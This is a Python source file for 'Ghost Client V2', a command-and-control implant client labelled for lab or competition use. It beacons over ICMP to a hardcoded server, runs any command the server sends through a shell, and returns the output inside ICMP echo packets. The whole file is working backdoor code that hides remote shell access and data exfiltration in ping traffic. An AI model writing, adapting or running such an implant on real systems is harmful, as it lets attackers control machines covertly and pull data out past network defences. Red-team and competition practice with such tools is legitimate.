# Author: Miller Swank
# Ghost Client V2
# This program is intended for lab or competition use only.

import time
import socket
import subprocess

from scapy.layers.inet import IP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send, AsyncSniffer


SERVER_IP = "192.168.10.170"

def get_local_ip():
    try:
        ip = subprocess.check_output(
            ["hostname", "-I"],
            text=True
        ).strip().split()[0]

        return ip
    except Exception as e:
        print(f"[!] Failed to get local IP: {e}")
        return None

LOCAL_IP = get_local_ip()

def send_beacon():
    # include local IP in payload for server to parse
    payload = f"BEACON|{LOCAL_IP}|ThisIsABeacon".encode()
    pkt = IP(dst=SERVER_IP)/ICMP(type=8)/payload
    send(pkt, verbose=0)

def handle_incoming(pkt):
    # Look for ICMP Echo Requests FROM the server
    print("Received packet")

    if IP in pkt and ICMP in pkt:
        if pkt[IP].src == SERVER_IP and pkt[ICMP].type == 8:
            if pkt.haslayer(Raw) and pkt[IP].dst == LOCAL_IP: # troubleshoot here if command exec stops working
                # need to handle CMD vs regular
                task = pkt[Raw].load.decode(errors="ignore")
                print(f"[+] Received task: {task}")
                run_task(task)

def run_task(cmd):
    # Execute and send back results
    MAX_PAYLOAD = 1460
    PREFIX = b"RESULT|"

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        result_bytes = output
    except Exception as e:
        result_bytes = str(e).encode(errors="ignore")

    # Include client IP
    ip_bytes = LOCAL_IP.encode()

    # Build prefix: RESULT|IP|
    full_prefix = PREFIX + ip_bytes + b"|"

    # Leave room for prefix
    max_result_bytes = MAX_PAYLOAD - len(full_prefix)

    # Truncate safely
    result_bytes = result_bytes[:max_result_bytes]

    payload = full_prefix + result_bytes

    pkt = IP(dst=SERVER_IP)/ICMP(type=8)/payload
    send(pkt, verbose=0)

    print(f"[+] Sent results: {payload}")

if __name__ == "__main__":
    sniffer = AsyncSniffer(filter=f"icmp and src {SERVER_IP}", prn=handle_incoming, store=False)
    sniffer.start()

    while True:
        send_beacon()
        print("[+] Beacon sent")
        time.sleep(10)
